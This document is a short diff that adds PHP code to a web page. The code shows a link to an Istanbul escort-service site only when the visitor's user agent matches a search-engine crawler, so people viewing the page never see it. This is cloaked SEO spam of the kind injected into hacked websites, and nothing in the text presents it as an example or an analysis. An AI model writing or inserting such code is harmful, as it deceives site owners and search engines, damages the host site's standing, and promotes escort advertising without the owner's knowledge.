@@ -1,0 +1,7 @@
+<?php
+ if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+?>
+<a href="http://www.escortsistanbul.com/istanbul/taksimescort/" target="_blank" title="taksim escort">taksim escort</a>
+<?php
+  }
+?>
